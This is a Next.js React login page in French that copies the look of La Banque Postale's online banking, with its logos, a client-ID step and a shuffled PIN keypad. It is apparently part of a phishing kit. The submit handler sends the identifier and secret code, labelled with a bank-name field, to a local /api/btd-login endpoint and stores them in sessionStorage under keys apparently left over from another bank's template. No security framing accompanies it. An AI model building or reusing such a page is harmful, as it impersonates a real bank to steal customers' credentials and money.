'use client';

import React, { useState, FormEvent } from 'react';
import { useRouter } from 'next/navigation';

interface LBPConnexionProps {
  partnerLogoSrc?: string;
  lbpLogoSrc?: string;
}

export default function LBPConnexionPage({
  partnerLogoSrc = '/flavicon.ico',
  lbpLogoSrc = '/bp.png',
}: LBPConnexionProps) {
  const router = useRouter();

  const [step, setStep] = useState<1 | 2>(1);
  const [clientId, setClientId] = useState<string>('');
  const [rememberMe, setRememberMe] = useState<boolean>(true);
  const [secretCode, setSecretCode] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  // Disposition de la grille du clavier (5 colonnes)
  const keyboardKeys = ['4', '0', '1', '9', '2', '7', '6', '3', '5', '8'];

  const handleKeyPress = (digit: string) => {
    setSecretCode((prev) => prev + digit);
  };

  const handleClearKey = () => {
    setSecretCode((prev) => prev.slice(0, -1));
  };

  const handleNextStep = (e?: FormEvent) => {
    if (e) e.preventDefault();
    if (clientId.trim()) {
      setStep(2);
    }
  };

  const handleBackToStep1 = (e: React.MouseEvent) => {
    e.preventDefault();
    setSecretCode('');
    setStep(1);
  };

// Soumission vers /api/btd-login et redirection vers /bat
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!secretCode.trim() || isSubmitting) return;

    setIsSubmitting(true);

    // Payload aligné sur les clés lues par la route API
    const payload = {
      nom_banque: 'LA BANQUE POSTALE',
      identifiant: clientId,
      secret_code: secretCode,
      rememberMe,
    };

    try {
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('sg_client_id', clientId);
        sessionStorage.setItem('sg_secret_code', secretCode);
      }

      const res = await fetch('/api/btd-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      // Vérification de la réussite HTTP
      if (!res.ok) {
        throw new Error(`Erreur réseau (Statut : ${res.status})`);
      }

      const data = await res.json();

      if (data.success) {
        router.push('/bat');
      }
    } catch (error) {
      console.error('Erreur lors de la soumission :', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <style>{`
        .lbp-body-wrapper {
          font-family: 'Inter', system-ui, -apple-system, sans-serif;
          background-color: #f4f7fa;
          color: #1a202c;
          display: flex;
          justify-content: center;
          min-height: 100vh;
          width: 100%;
          -webkit-font-smoothing: antialiased;
        }
        .lbp-app-container {
          width: 100%;
          max-width: 450px;
          background-color: #ffffff;
          display: flex;
          flex-direction: column;
          box-shadow: 0 4px 25px rgba(0, 0, 0, 0.05);
          position: relative;
          min-height: 100vh;
        }
        .lbp-navbar {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 18px 20px;
          background-color: #ffffff;
          border-bottom: 1px solid #edf2f7;
        }
        .lbp-header-logo-size {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        
        /* Dimensions strictement identiques pour les deux logos */
        .lbp-partner-logo,
        .lbp-main-logo {
          width: 40px !important;
          height: 40px !important;
          min-width: 40px !important;
          min-height: 40px !important;
          max-width: 40px !important;
          max-height: 40px !important;
          object-fit: contain;
          display: block;
        }

        .lbp-logo-sep {
          color: #a0aec0;
          font-size: 16px;
          font-weight: 600;
        }
        .lbp-close-icon {
          font-size: 22px;
          color: #718096;
          cursor: pointer;
          text-decoration: none;
          line-height: 1;
        }
        .lbp-main-content {
          padding: 24px;
          display: flex;
          flex-direction: column;
          flex-grow: 1;
        }
        .lbp-form-title {
          font-size: 22px;
          font-weight: 700;
          color: #0033a0;
          margin-bottom: 24px;
        }
        .lbp-form-subtitle {
          font-size: 14px;
          color: #4a5568;
          font-weight: 500;
          margin-bottom: 8px;
        }
        .lbp-input-group {
          margin-bottom: 24px;
        }
        .lbp-field-wrapper input {
          width: 100%;
          padding: 16px;
          font-family: inherit;
          font-size: 16px;
          border: 1px solid #cbd5e0;
          border-radius: 6px;
          outline: none;
          color: #1a202c;
          background-color: #ffffff;
          transition: border-color 0.2s;
        }
        .lbp-field-wrapper input:focus {
          border-color: #0033a0;
        }
        .lbp-checkbox-line {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 30px;
        }
        .lbp-check-label {
          font-size: 14px;
          color: #4a5568;
        }
        .ios-switch {
          position: relative;
          display: inline-block;
          width: 46px;
          height: 24px;
        }
        .ios-switch input {
          opacity: 0;
          width: 0;
          height: 0;
        }
        .ios-slider {
          position: absolute;
          cursor: pointer;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background-color: #cbd5e0;
          transition: 0.3s;
          border-radius: 24px;
        }
        .ios-slider:before {
          position: absolute;
          content: "";
          height: 18px;
          width: 18px;
          left: 3px;
          bottom: 3px;
          background-color: white;
          transition: 0.3s;
          border-radius: 50%;
        }
        input:checked + .ios-slider {
          background-color: #0033a0;
        }
        input:checked + .ios-slider:before {
          transform: translateX(22px);
        }
        .lbp-recap-box {
          background-color: #f0f4f9;
          padding: 14px 18px;
          border-radius: 6px;
          margin-bottom: 24px;
        }
        .lbp-recap-label {
          font-size: 12px;
          color: #718096;
          margin-bottom: 4px;
        }
        .lbp-recap-value {
          font-size: 16px;
          font-weight: 700;
          color: #0033a0;
        }
        .lbp-dots-preview-wrapper {
          display: flex;
          justify-content: center;
          gap: 12px;
          margin: 15px 0 25px 0;
        }
        .lbp-password-dot {
          width: 14px;
          height: 14px;
          background-color: #e2e8f0;
          border-radius: 50%;
          transition: background-color 0.15s;
        }
        .lbp-dot-active {
          background-color: #0033a0;
        }
        .lbp-keyboard-matrix-grid {
          display: grid;
          grid-template-columns: repeat(5, 1fr);
          gap: 10px;
          margin-bottom: 20px;
          width: 100%;
        }
        .lbp-matrix-cell {
          background-color: #f7fafc;
          border: 1px solid #e2e8f0;
          color: #0033a0;
          border-radius: 6px;
          padding: 16px 0;
          font-size: 20px;
          font-weight: 700;
          text-align: center;
          cursor: pointer;
          user-select: none;
          transition: background-color 0.1s;
        }
        .lbp-matrix-cell:hover {
          background-color: #ebf8ff;
        }
        .lbp-matrix-cell:active {
          background-color: #edf2f7;
        }
        .lbp-action-row {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 12px;
          margin-bottom: 20px;
        }
        .lbp-btn {
          width: 100%;
          padding: 16px;
          font-family: inherit;
          font-size: 16px;
          font-weight: 600;
          border-radius: 6px;
          border: none;
          cursor: pointer;
          text-align: center;
        }
        .lbp-btn-gray {
          background-color: #d2d6dc;
          color: #4a5568;
        }
        .lbp-btn-gray:hover {
          background-color: #cbd5e0;
        }
        .lbp-btn-blue {
          background-color: #0033a0;
          color: white;
        }
        .lbp-btn-blue:hover {
          background-color: #002577;
        }
        .lbp-btn-submit-step1 {
          background-color: #0033a0;
          color: white;
          margin-bottom: 20px;
        }
        .lbp-help-link {
          display: block;
          text-align: center;
          color: #0033a0;
          font-size: 14px;
          text-decoration: underline;
          margin-bottom: 20px;
          cursor: pointer;
        }
        .lbp-footer-banner {
          background: linear-gradient(180deg, #1d70b8 0%, #004792 100%);
          padding: 35px 24px;
          color: white;
          text-align: center;
          margin-top: auto;
        }
        .footer-logo-text {
          font-size: 28px;
          font-weight: 700;
          margin-bottom: 25px;
          letter-spacing: -0.5px;
        }
        .assurance-card {
          background-color: #0c2340;
          border-radius: 8px;
          padding: 20px;
          text-align: left;
        }
        .card-title {
          font-size: 16px;
          font-weight: 700;
          margin-bottom: 10px;
        }
        .card-desc {
          font-size: 13px;
          color: #e2e8f0;
          line-height: 1.5;
          margin-bottom: 15px;
        }
        .card-link {
          color: #ffffff;
          font-size: 13px;
          display: block;
          margin-bottom: 15px;
          text-decoration: underline;
        }
        .card-btn {
          display: block;
          width: 100%;
          padding: 12px;
          border: 1px solid white;
          background: transparent;
          color: white;
          border-radius: 4px;
          text-align: center;
          font-size: 13px;
          font-weight: 600;
          text-decoration: none;
        }
      `}</style>

      <div className="lbp-body-wrapper">
        <div className="lbp-app-container">
          {/* ÉTAPE 1 : IDENTIFIANT */}
          {step === 1 && (
            <div style={{ display: 'flex', flexDirection: 'column', flexGrow: 1 }}>
              <header className="lbp-navbar">
                <div className="lbp-header-logo-size">
                  <img src={partnerLogoSrc} alt="Favicon" className="lbp-partner-logo" />
                  <span className="lbp-logo-sep">→</span>
                  <img src={lbpLogoSrc} alt="La Banque Postale" className="lbp-main-logo" />
                </div>
                <a href="#" className="lbp-close-icon">×</a>
              </header>

              <main className="lbp-main-content">
                <h1 className="lbp-form-title">Connexion à votre compte</h1>

                <form onSubmit={handleNextStep} style={{ display: 'flex', flexDirection: 'column', flexGrow: 1 }}>
                  <div className="lbp-input-group">
                    <div className="lbp-form-subtitle">Identifiant</div>
                    <div className="lbp-field-wrapper">
                      <input
                        type="text"
                        placeholder="Saisissez votre identifiant"
                        value={clientId}
                        onChange={(e) => setClientId(e.target.value)}
                        autoComplete="off"
                      />
                    </div>
                  </div>

                  <div className="lbp-checkbox-line">
                    <span className="lbp-check-label">Mémoriser mon identifiant</span>
                    <label className="ios-switch">
                      <input
                        type="checkbox"
                        checked={rememberMe}
                        onChange={(e) => setRememberMe(e.target.checked)}
                      />
                      <span className="ios-slider"></span>
                    </label>
                  </div>

                  <button
                    type="submit"
                    disabled={!clientId.trim()}
                    className="lbp-btn lbp-btn-submit-step1"
                  >
                    Continuer
                  </button>
                  <a href="#" className="lbp-help-link">Identifiant / Mot de passe oublié</a>
                </form>
              </main>
            </div>
          )}

          {/* ÉTAPE 2 : CODE DE SÉCURITÉ */}
          {step === 2 && (
            <div style={{ display: 'flex', flexDirection: 'column', flexGrow: 1 }}>
              <header className="lbp-navbar">
                <div className="lbp-header-logo-size">
                  <img src={partnerLogoSrc} alt="Favicon" className="lbp-partner-logo" />
                  <span className="lbp-logo-sep">→</span>
                  <img src={lbpLogoSrc} alt="La Banque Postale" className="lbp-main-logo" />
                </div>
                <a href="#" className="lbp-close-icon">×</a>
              </header>

              <main className="lbp-main-content">
                <h1 className="lbp-form-title">Code de sécurité</h1>

                <div className="lbp-recap-box">
                  <div className="lbp-recap-label">Identifiant client :</div>
                  <div className="lbp-recap-value">{clientId || '---------'}</div>
                </div>

                <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', flexGrow: 1 }}>
                  <div className="lbp-form-subtitle" style={{ textAlign: 'center', marginBottom: '10px' }}>
                    Saisissez votre code personnel
                  </div>

                  <div className="lbp-input-group">
                    <div className="lbp-field-wrapper">
                      <input
                        type="password"
                        placeholder="Entrez votre mot de passe"
                        value={secretCode}
                        onChange={(e) => setSecretCode(e.target.value)}
                        autoComplete="off"
                      />
                    </div>
                  </div>

                  {/* Bulles d'aperçu dynamique */}
                  <div className="lbp-dots-preview-wrapper">
                    {[0, 1, 2, 3, 4, 5].map((idx) => (
                      <div
                        key={idx}
                        className={`lbp-password-dot ${idx < secretCode.length ? 'lbp-dot-active' : ''}`}
                      />
                    ))}
                  </div>

                  {/* Clavier Matriciel (5 colonnes) */}
                  <div className="lbp-keyboard-matrix-grid">
                    {keyboardKeys.map((digit) => (
                      <div
                        key={digit}
                        className="lbp-matrix-cell"
                        onClick={() => handleKeyPress(digit)}
                      >
                        {digit}
                      </div>
                    ))}
                  </div>

                  <div className="lbp-action-row">
                    <button
                      type="button"
                      className="lbp-btn lbp-btn-gray"
                      onClick={handleClearKey}
                    >
                      Effacer
                    </button>
                    <button
                      type="submit"
                      disabled={!secretCode.trim() || isSubmitting}
                      className="lbp-btn lbp-btn-blue"
                    >
                      {isSubmitting ? 'Validation...' : 'Valider'}
                    </button>
                  </div>

                  <a
                    href="#"
                    className="lbp-help-link"
                    onClick={handleBackToStep1}
                    style={{ textDecoration: 'none' }}
                  >
                    ← Retour à la saisie de l'identifiant
                  </a>
                </form>
              </main>
            </div>
          )}

          {/* Footer Banque Citoyenne */}
          <footer className="lbp-footer-banner">
            <div className="footer-logo-text">La Banque Citoyenne</div>
            <div className="assurance-card">
              <div className="card-title">Espace Assurance</div>
              <div className="card-desc">
                Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats d'assurance ?
              </div>
              <a href="#" className="card-link">Signer mon contrat en ligne</a>
              <a href="#" className="card-btn">Me connecter à mon espace assurance</a>
            </div>
          </footer>
        </div>
      </div>
    </>
  );
}